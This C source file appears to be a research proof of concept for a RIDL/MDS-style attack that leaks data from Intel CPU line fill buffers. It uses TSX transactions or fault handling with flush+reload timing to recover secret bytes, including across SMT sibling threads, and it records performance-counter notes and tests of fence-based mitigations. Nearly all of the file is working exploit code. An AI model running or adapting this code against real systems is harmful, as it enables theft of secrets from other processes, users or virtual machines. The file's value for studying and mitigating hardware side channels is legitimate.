#ifndef NO_COUNTERS
#include "../libpfc/include/libpfc.h"
#endif
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>

#include <sys/prctl.h>
#define PR_GET_SPECULATION_CTRL 52
#define PR_SET_SPECULATION_CTRL 53
#ifndef PR_SPEC_DISABLE
#define PR_SPEC_DISABLE 4
#endif

#include <signal.h>
#include <setjmp.h>
static jmp_buf buf;

typedef signed long long sll;

// to leak from another SMT thread *using mfence*:
// TSX:     -DUSE_TSX -DNULL_LEAK -DMITIGATION_MFENCE -DNO_STORE_SECRET -DNO_FLUSH_SECRET
// non-TSX: -DBUF_OFFSET=0x140 -DMADVISE_AWAY -DNO_SACRIFICE
//          plus either -DUSE_CLFLUSHOPT/-DCLFLUSHOPT_FLUSH (noisier) or -DMITIGATION_MFENCE/-DMFENCE_AFTER_FLUSH/-DSFENCE_AFTER_FLUSH (clear)
//            [this is because we need the flushes to be before the leak?]
//          plus -DNO_STORE_SECRET -DNO_FLUSH_SECRET if you don't want to self-leak
//	    why NO_SACRIFICE? because clflush(leak) is bad when we rely on MADVISE_AWAY. ONLY_SFENCE works fine.

// TODO: non-TSX leaks with mfence:
//  machine_clears.memory_ordering is 0 :o (and similarly low on the other side)
//  cycle_activity.cycles_l2_pending is correlated to # successful leaks (incl. zeros)
//    without mfence on the other side, it's correlated to the # leaks of zero
//  port 0 is somewhat higher when mfence is running, ~10/iter
//  port 1 is slightly higher when mfence is running, ~6/iter
//  port 3 is much higher when mfence is running, uops moved from port 2, ~60/iteration
//  port 5 is a bit higher with mfence, ~5/iter
//  port 6 is considerably lower with mfence (~30/iter)
//  port 7 is a little bit lower with mfence (~0.66/iter, weirdly enough)

// with TSX, self-leak, retired uops (i.e. we don't see speculated ones):
// 259 stores:
//  - 256 cache line flushes
//  - 1 leak flush
//  - 1 secret flush
//  - 1 secret store
// 3 loads
//  - 1 is structural, it's there even if we do nothing
//  - 2 are gone with NO_LEAK, so they're our leak

// int_misc.recovery_cycles is 22 per iteration
// or 28 with NO_SACRIFICE, or 29 with only the sfence
// 23 with NO_SACRIFICE and NO_FLUSH_SECRET

// no TSX: NO_FLUSH -> 0 cycles
// TSX: NO_FLUSH+NO_SACRIFICE -> 0 cycles
// NO_LEAK -> 5 cycles, this is the cost of a branch mispredict in the flush loop

// -DUSE_TSX -DINCOMPLETE_LEAK [-DTEMPORAL_LEAK] -DNO_SACRIFICE -DNO_FLUSH_SECRET
// -> 6 cycles (it's actually slightly more with -DNO_LEAK -> noise)
// looks like 20 cycles difference with only -DINCOMPLETE_LEAK
 
//#define USE_TSX           /* This is currently a requirement for self-leaking. */
//#ifndef ITERS
#if 0
#define ITERS 100000      /* The number of leak attempts we perform. */
#endif
#ifndef SECRET_VALUE
#define SECRET_VALUE 0x42 /* Pick your own super secret value. */
#endif

#ifndef MAX_VALUE
#define MAX_VALUE 256
#endif

#ifdef NULL_LEAK
#define NO_SACRIFICE
#endif

#define nop "nop\n"
#define nop5 nop nop nop nop nop
#define nop10 nop5 nop5
#define nop50 nop10 nop10 nop10 nop10 nop10
#define nop100 nop50 nop50
#define nop500 nop100 nop100 nop100 nop100 nop100

static inline __attribute__((always_inline)) void movnti(volatile void *p, uint64_t v) {
    asm volatile("movnti %1, (%0)\n" :: "r" (p), "r" (v));
}

static inline __attribute__((always_inline)) __int128 movntdqa(volatile void *p) {
    __int128 ret;

    asm volatile("movntdqa (%1), %0\n"
        : "=x" (ret)
        : "r" (p));

    return ret;
}


static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
	uint64_t lo, hi;

	asm volatile("rdtscp\n" : "=a" (lo), "=d" (hi) :: "rcx");

	return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) void clflush(volatile void *p) {
#ifdef USE_CLFLUSHOPT
	// PERF: resource_stalls.sb is much lower with clflushopt (even lower without TSX)
	// also cycle_activity.stalls_l2_pending
	// PERF: l2_rqsts.demand_data_rd_miss++ for NO_SACRIFICE with clflushopt (like mfence/sfence, below)
	// TODO: l2_rqsts.l2_pf_hit is also higher in these cases
	asm volatile("clflushopt (%0)\n" :: "r" (p));
#else
	asm volatile("clflush (%0)\n" :: "r" (p));
#endif
}

static void unblock_signal(int signum) {
	sigset_t sigs;
	sigemptyset(&sigs);
	sigaddset(&sigs, signum);
	sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

static void segfault_handler() {
	unblock_signal(SIGSEGV);
	longjmp(buf, 1);
}

int main(int argc, char *argv[]) {
	__attribute__((aligned(4096))) size_t results[256] = {0};
	size_t k, x;

	// printf("stack %p, main %p\n", results, &main);

#ifndef NO_SSBM
	// mitigate SSB, to be sure
	prctl(PR_SET_SPECULATION_CTRL, 0, 8, 0, 0);
	prctl(PR_SET_SPECULATION_CTRL, 0, 2, 0, 0); // should fail
	prctl(PR_GET_SPECULATION_CTRL, 0, 0, 0, 0);
#endif

#ifdef NULL_LEAK
	signal(SIGSEGV, segfault_handler);
#endif

#ifdef NO_COUNTERS
 #ifndef ITERS
	if (argc != 2) {
		printf("usage: <iters>\n");
		return 1;
	}
	size_t ITERS = atoi(argv[1]);
 #endif
#else
	pfcInit();
	pfcPinThread(1);

	PFC_CFG cfgs[7] = {2,2,2,0,0,0,0};
	PFC_CNT cnts[7] = {0};
	PFC_CNT CNT[7] = {0};
	if (argc < 3) {
		printf("usage: <iters> <perf event>\n");
		pfcDumpEvts();
		return 1;
	}
 #ifndef ITERS
	size_t ITERS = atoi(argv[1]);
 #endif
	cfgs[3] = pfcParseCfg(argv[2]);
	if (argc > 3)
		cfgs[4] = pfcParseCfg(argv[3]);
	if (argc > 4)
		cfgs[5] = pfcParseCfg(argv[4]);
	if (argc > 5)
		cfgs[6] = pfcParseCfg(argv[5]);
	
	pfcWrCfgs(0, 7, cfgs);
	pfcWrCnts(0, 7, cnts);
#endif

	/* reloadbuffer is what we'll use for the flush/reload, at a stride of 1024. */
	unsigned char *reloadbuffer = mmap(NULL, 4096 + (256 * 1024), PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	/* Today, 'leak' will represent the contents of Intel's line fill buffers. */
#ifdef USE_TSX
	// allocate >4096 to have some guard pages, also useful for experiments below
	volatile unsigned char *leak = mmap(NULL, 4096*4, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
	/* We're going to put 0x01 in the memory, and then leak that value! */
	memset((char *)leak, 0x01, 4096);
	memset((char *)leak+4096, 0x02, 4096);
#else
#ifdef MADVISE_AWAY
	volatile unsigned char *leak = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
#else
	volatile unsigned char *leak = mmap(NULL, 4096 * (ITERS+1), PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

	/* Page faults are not good for our signal. */
	memset((char *)leak, 0x01, 4096 * (ITERS+1));

//	madvise(leak, 4096 * (ITERS+1), MADV_NOHUGEPAGE); /* TODO: does this work? */ 
#endif
	//	MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
#endif

#ifdef NULL_LEAK
	/* Compilers... */
	leak = argc > 0 ? NULL : (unsigned char *)(uint64_t)(argc + 5);
#endif

#ifdef FLUSH_TARGET_PAGES
	/* We're going to use this memory to flush a secret. */
	volatile unsigned char *privatebuf = mmap(NULL, 4096*16, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
#else
 #ifdef RANDOM_PREFETCH
	/* We're going to use this memory to do terrible things. */
	volatile unsigned char *privatebuf = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
 #else
	/* We're going to use this memory to store a secret. */
	volatile unsigned char *privatebuf = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
 #endif
#endif

#ifdef JAMMING
	volatile unsigned char *jambuf = mmap(NULL, 16 * 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
	jambuf += 0x180;
#endif

	/* Push all the addresses a couple of cache lines out, to reduce noise. */
#ifdef BUF_OFFSET
	reloadbuffer = reloadbuffer + BUF_OFFSET;
#else
	reloadbuffer = reloadbuffer + 0x80;
#endif
#ifndef NULL_LEAK
#ifndef MADVISE_AWAY
#ifndef READ_OFFSET
	leak = leak + 0x100;
#endif
#endif
#endif
#ifndef FLUSH_TARGET_PAGES
#ifndef VICTIM_OFFSET
	privatebuf = privatebuf + 0x180;
#endif
#endif

#ifndef VICTIM_OFFSET
#define VICTIM_OFFSET 0 /* The page offset we write the secret to. SEE BELOW, default is 0x180. */
#endif
#ifndef READ_OFFSET
#define READ_OFFSET 0     /* The LFB entry offset we leak from, <64. SEE BELOW, default is 0x100. */
#endif

#ifndef USE_TSX
 #ifndef MADVISE_AWAY
	volatile unsigned char *baseleak = leak;
 #endif
#endif

#ifdef LEAK_READ
	*(volatile unsigned int *)(privatebuf+VICTIM_OFFSET) = SECRET_VALUE;
	*(volatile unsigned int *)(privatebuf+VICTIM_OFFSET+32) = SECRET_VALUE+0x10;
	clflush(privatebuf+VICTIM_OFFSET);
	clflush(privatebuf+VICTIM_OFFSET+32);

	/* This is not necessary, but just to be sure.. */
	mprotect((void *)privatebuf, 4096, PROT_READ);
#endif

#ifdef SPECULATE
	unsigned char *srcs[256];
	for (int j = 0; j < 256; ++j) {
		srcs[j] = &k;
	/*	if ((j & 0xa5) == 0)
			srcs[j] = leak;*/
	}
	srcs[64] = leak + READ_OFFSET;
#endif

#ifdef TRACK_ABORTS
	size_t non_aborts = 0;
#endif

	for (size_t i = 0; i < ITERS; ++i) {
#ifndef USE_TSX
 #ifdef MADVISE_AWAY
		madvise((void *)leak, 4096, MADV_DONTNEED);
 #else
  #ifndef NULL_LEAK
		leak += 4096;
		//clflush(leak);
		//leak = baseleak + (((i * 167) + 13) & 0xffff)*4096;
  #endif
 #endif
#endif

#ifdef FLUSH_TARGET_PAGES
	#define NO_STORE_SECRET
	/* *(privatebuf + TARGET_OFFSET+4096*0) = 3;
	*(privatebuf + TARGET_OFFSET+4096*1) = 3;
	*(privatebuf + TARGET_OFFSET+4096*2) = 3;
	*(privatebuf + TARGET_OFFSET+4096*3) = 3; */
	//asm volatile("mfence");
#endif

#ifndef NO_COUNTERS
		/* We destroy our signal if we start later (TODO: probably not entirely true). */
		PFCSTART(CNT);
#endif

#ifdef SYSCALL
#define NO_STORE_SECRET
		asm volatile (
		"mfence\n"
		"mov $0x9999999999999999, %%rax\n"
		"mov $0x9999999999999999, %%rcx\n"
		"mov $0x9999999999999999, %%r11\n"
		"syscall"
		::: "rax","rcx","r11");
#endif

#ifdef LEAK_READ
#define NO_STORE_SECRET
		*(volatile unsigned char *)(privatebuf+VICTIM_OFFSET);
#endif

#ifndef NO_STORE_SECRET
#ifdef NON_TEMPORAL
		/* We're paranoid, so let's not even put our secret in the L1 cache.
                   Instead, we do a non-temporal store here instead. */
		/* (This seems to kill the signal in the self-leak case.) */
		movnti(privatebuf + VICTIM_OFFSET, SECRET_VALUE);
#else
		/* Put a secret into L1 cache. It's okay, it's private. */
		// PERF: this increments l2_trans.rfo (read-for-ownership) and l2_rqsts.rfo_miss
#ifdef TARGETED_LEAK
		*(volatile unsigned int *)(privatebuf+VICTIM_OFFSET) = SECRET_VALUE-0x10;
		*(volatile unsigned int *)(privatebuf+VICTIM_OFFSET+64) = SECRET_VALUE;
		*(volatile unsigned int *)(privatebuf+VICTIM_OFFSET+128) = SECRET_VALUE+0x10;
#else
		*(volatile unsigned int *)(privatebuf+VICTIM_OFFSET) = SECRET_VALUE;
#endif
#endif
#endif // NO_STORE_SECRET

//#define PARANOID
#ifdef PARANOID
		/* Make sure it doesn't get store forwarded or whatever. */
		asm volatile(nop500 nop500 nop500 nop500 nop500);
		asm volatile("lfence\nsfence\nlfence\nmfence");
		asm volatile("sfence\nlfence\nsfence\nmfence");
		asm volatile(nop500 nop500 nop500 nop500 nop500);
#endif

#ifndef NO_FLUSH
		/* Flush the buffer we'll use as a side channel. */
		// PERF: br_misp_retired.all_branches++ per (outer) iteration.
		for (k = 0; k < MAX_VALUE; ++k) {
			x = ((k * 167) + 13) & (MAX_VALUE-1);
#ifdef CLFLUSHOPT_FLUSH
			asm volatile ("clflushopt (%0)\n"::"r"(reloadbuffer + x * 1024));
#else
			clflush(reloadbuffer + x * 1024);
#endif
		}
#endif

#ifdef MFENCE_AFTER_FLUSH
		asm volatile ("mfence");
#endif
#ifdef SFENCE_AFTER_FLUSH
		asm volatile ("sfence");
#endif

#ifdef JAMMING
		*(volatile unsigned char *)(jambuf - 0x180);
		//*(volatile unsigned char *)(jambuf + 4096*0) = 0x99;
		*(volatile unsigned char *)(jambuf + 4096*0);
		*(volatile unsigned char *)(jambuf + 4096*1);
		*(volatile unsigned char *)(jambuf + 4096*2);
		*(volatile unsigned char *)(jambuf + 4096*4);
		*(volatile unsigned char *)(jambuf + 4096*5);
		*(volatile unsigned char *)(jambuf + 4096*6);
		*(volatile unsigned char *)(jambuf + 4096*7);
		*(volatile unsigned char *)(jambuf + 4096*8);
		*(volatile unsigned char *)(jambuf + 4096*9);
#endif

		/*asm volatile(nop500 nop500 nop500 nop500 nop500);
		asm volatile(nop500 nop500 nop500 nop500 nop500);
		asm volatile(nop500 nop500 nop500 nop500 nop500);
		asm volatile(nop500 nop500 nop500 nop500 nop500);
		asm volatile(nop500 nop500 nop500 nop500 nop500);*/

#ifndef NO_SACRIFICE
		/* Make a sacrifice to the CPU at the appropriate moment. */
		/* (We want a LFB entry to be allocated for leak.) */
		/* This isn't required for a *potential* leak, but it is to get a self-leak signal. */

		// PERF: cycle_activity.cycles_l2_pending is high if you use one of these, higher if you use both
		// PERF: dtlb_load_misses.stlb_hit is 2xITERS without this (iff we leak, only checked non-temporal.)
		//       note: in non-TSX demand paging, dtlb_load_misses.miss_causes_a_walk is ITERS without this (in TSX: 0)
		// PERF: tx_mem.abort_conflict is 2xITERS with this (otherwise just ITERS)
		// PERF: l2_trans.demand_data_rd++ with this (+2 without MITIGATION_MFENCE)
		//       .. but only if you try leaking (with or without non-tmeporal leak).
		// PERF: l2_rqsts.demand_data_rd_miss += 3 (+2 with MITIGATION_MFENCE)
		// (also +2 with non-temporal leak, then MITIGATION_MFENCE doens't matter)
		// TODO: l2_trans.all_requests seems considerably higher with this
#ifdef WRITE_DURING_SACRIFICE
		*(leak + READ_OFFSET) = 0xaa;
#endif
#ifdef SPECULATE
		// FIXME: why do you need 64 iterations to cause a mispredict :/
		for (k = 0; k < 64; ++k) {
			unsigned char *branch_or_leak = srcs[k];
			clflush(branch_or_leak);
		}
#else
		clflush(leak + READ_OFFSET);
#endif
#ifndef NO_SFENCE
#ifdef SPECULATE_SFENCE
		if ((i % 2) == 0)
#endif
		asm volatile("sfence");
#endif
#endif
#ifdef ONLY_SFENCE
		asm volatile("sfence");
#endif

#ifdef FLUSH_TARGET_PAGES
	#define NO_FLUSH_SECRET
	// you need three of these for a reasonable signal when writing 4 lines [no mfence] on the other end
	// fourth one doesn't really make a difference..?
	clflush(privatebuf + TARGET_OFFSET+4096*1);
	clflush(privatebuf + TARGET_OFFSET+4096*2);
	clflush(privatebuf + TARGET_OFFSET+4096*3);
	/* *(privatebuf + TARGET_OFFSET+4096*0) = 3;
	*(privatebuf + TARGET_OFFSET+4096*1) = 3;
	*(privatebuf + TARGET_OFFSET+4096*2) = 3;
	*(privatebuf + TARGET_OFFSET+4096*3) = 3; */
#endif

#ifndef NO_FLUSH_SECRET
  #ifdef NON_TEMPORAL
		/* If the data didn't go into the L1 cache, we don't need to evict it. */
  #else
    #ifdef SPECULATE_FLUSH_SECRET
		if ((i % 2) == 0)
    #endif
		/* Oh-oh, the Foreshadow attack means we can't trust the L1 cache. */
		/* Flush the memory containing the secret. It's gone now, we're safe! Phew. */
    #ifdef TARGETED_LEAK
		/* Show we can target a cache line: pick the one with the secret. */
		clflush(privatebuf + VICTIM_OFFSET + 64);
    #else
		clflush(privatebuf + VICTIM_OFFSET);
    #endif
		/* (Note that in a multi-thread situation, the attacker can do this themselves.) */
  #endif
#endif

#ifdef MITIGATION_WAIT
		/* This kills the signal+zeros ONLY if you use clflushopt instead of clflush. */
		// PERF: MITIGATION_WAIT+USE_CLFLUSHOPT: rtm_retired.aborted_mem -> 0
		// also tx_mem.abort_conflict -> 0
		asm volatile(nop500 nop500 nop500 nop500 nop500);
#endif
#ifdef MITIGATION_SFENCE
		/* This kills the signal. */
		// PERF: with NO_SACRIFICE, this is l2_rqsts.demand_data_rd_miss++
		// (this causes offcore_requests.all_data_rd+=2, for 0x00 and the real value)
		asm volatile("sfence");
#endif
#ifdef MITIGATION_LFENCE
		/* This doesn't help. */
		asm volatile("lfence");
#endif
#ifdef MITIGATION_MFENCE
		/* This kills the signal+zeros. */
		// PERF: rtm_retired.aborted_mem -> 0
		// PERF: with NO_SACRIFICE, this is l2_rqsts.demand_data_rd_miss++
		asm volatile("mfence");
#endif
#ifdef MITIGATION_OVERWRITE
		/* This kills the signal. */
		*(volatile unsigned int *)(privatebuf+VICTIM_OFFSET) = 0x54;
#endif
#ifdef FLUSH_AFTER_MITIGATION
		clflush(privatebuf + VICTIM_OFFSET);
#endif
#ifdef FLUSH_AGAIN_AFTER_MITIGATION
		clflush(privatebuf + VICTIM_OFFSET);
#endif

		// we want to jam L2 :(
		// prefetch/prefetchw useless, it seems
		// asm volatile("prefetchw (%0)"::"r"(leak + 0x400));

		// PERF: br_misp_retired.all_branches has a mispredict 

#ifndef NO_LEAK	
		/* Below, we load 'leak', which represents the LFB, and then
		   touch the page of our reload buffer corresponding to the
		   byte we loaded. Ideally, we do this in a TSX transaction,
		   and using a non-temporal load which always goesvia the LFB. */
		/* tl;dr: Now we steal the secret from the LFB. Thanks, Intel. */
		// PERF: machine_clears.memory_ordering for every potential leak attempt.
		//       also br_misp_retired.all_branches++ (this is probably xbegin)
		//    (potential --> not e.g. MITIGATION_WAIT+USE_CLFLUSHOPT or MITIGATION_MFENCE)
#ifdef SIGNAL_HANDLER
		if (!setjmp(buf))
#endif
		asm volatile(
#ifdef USE_TSX
		// TODO: l2_rqsts.l2_pf_hit is much higher for TSX
		// TODO: offcore_requests.all_data_rd++ for TSX, only when you're doing a potential leak
		"xbegin abortpoint\n"
#ifdef TRACK_ABORTS
		"addq $0x1, (%2)\n" // TODO: this is not very elegant due to memory ref
#endif
#endif
#ifdef RANDOM_PREFETCH
		"prefetch (%2)\n"
#endif
#ifdef TEMPORAL_LEAK
		// Note: movzbq and movntdqa are not directly comparable (NT prbly ignored..?).
		// However movdqa also seems noticably worse (count the zeros). TODO: Weird. ALU ports?
 #ifdef USE_MOVDQA
		"movdqa (%0), %%xmm0\n"
		"movq %%xmm0, %%rax\n"
		"and $0xff, %%rax\n"
 #else
  #ifdef USE_MOVDQU
		"movdqu (%0), %%xmm0\n"
		"movq %%xmm0, %%rax\n"
		"and $0xff, %%rax\n"
  #else
		"movzbq (%0), %%rax\n"
  #endif
 #endif
#else
		// PERF: offcore_requests.all_data_rd++ for every leak
		"movntdqa (%0), %%xmm0\n"
		"movq %%xmm0, %%rax\n"
		"and $0xff, %%rax\n"
#endif
		"shl $0xa, %%rax\n"
#ifndef INCOMPLETE_LEAK
		// PERF: offcore_requests.all_data_rd++ for every touched page
  #ifdef TEMPORAL_LEAK_END
		"movzbl (%%rax, %1), %%rax\n"
  #else
    #ifdef PREFETCH_LEAK
		"prefetcht0 (%%rax, %1)\n"
    #else
		/*"lea (%%rax, %1), %%rax\n"
		"movnti %%rbx, (%%rax)\n"*/
     #ifdef RELOAD_TWICE
		"movntdqa (%%rax, %1), %%xmm0\n"
     #endif
		"movntdqa (%%rax, %1), %%xmm0\n"
    #endif
  #endif
#endif
#ifdef USE_TSX
		"xend\n"
		"abortpoint:\n"
#endif
#ifdef TRACK_ABORTS
		::"r"(leak + READ_OFFSET), "r"(reloadbuffer), "r"(&non_aborts):"rax"
#else
 #ifdef RANDOM_PREFETCH
		::"r"(leak + READ_OFFSET), "r"(reloadbuffer), "r"(privatebuf+VICTIM_OFFSET):"rax"
 #else
		::"r"(leak + READ_OFFSET), "r"(reloadbuffer):"rax"
 #endif
#endif
		);
#endif

		/* Prevent speculation into the reload loop. */
		asm volatile ("mfence");

#ifndef NO_COUNTERS
		PFCEND(CNT);
#endif

		//movnti(privatebuf + VICTIM_OFFSET, SECRET_VALUE); // FIXME
#ifdef OVERWRITE_END
		*(privatebuf + VICTIM_OFFSET) = 0x0;
		clflush(privatebuf + VICTIM_OFFSET);
		asm volatile("mfence");
#endif

#ifndef NO_RELOAD
		/* This is the reload loop, to work out which page we touched. */
		for (size_t k = 0; k < MAX_VALUE; ++k) {
			/* Intel's prefetcher is a menace. Make sure it doesn't read ahead. */
			x = ((k * 167) + 13) & (MAX_VALUE-1);

			/* If we touched this cache line, we leaked x. */
			unsigned char *p = reloadbuffer + (1024 * x);

			/* Time the access to see if we touched it. */
			uint64_t t0 = rdtscp();
			*(volatile unsigned char *)p;
			uint64_t dt = rdtscp() - t0;

			/* Is it within our threshold? */
			if (dt < 160) results[x]++;
		}
#endif
	}

#ifndef NO_COUNTERS
	pfcRemoveBias(CNT, ITERS);
#ifdef BORING_COUNTERS
	printf("Instructions Issued                  : %20lld\n", (sll)CNT[0]);
	printf("Unhalted core cycles                 : %20lld\n", (sll)CNT[1]);
	printf("Unhalted reference cycles            : %20lld\n", (sll)CNT[2]);
#endif
	printf("%-37s: %20lld\n", argv[2]                       , (sll)CNT[3]);
	if (argc > 3) printf("%-37s: %20lld\n", argv[3]                       , (sll)CNT[4]);
	if (argc > 4) printf("%-37s: %20lld\n", argv[4]                       , (sll)CNT[5]);
	if (argc > 5) printf("%-37s: %20lld\n", argv[5]                       , (sll)CNT[6]);
	pfcFini();
#endif

	/* Show the value(s) we leaked and how many times we saw them. */
	size_t total = 0;
	for (size_t c = 0; c < 256; ++c) {
#ifdef THRESHOLD
		if (results[c] > THRESHOLD)
#else
		if (results[c])
#endif
			printf("%8zu: 0x%02x\n", results[c], (int)c);
		total += results[c];
	}
	printf("total: %8zu\n", total);
#ifdef TRACK_ABORTS
	printf("non-aborts: %8zu\n", non_aborts);
#endif
}

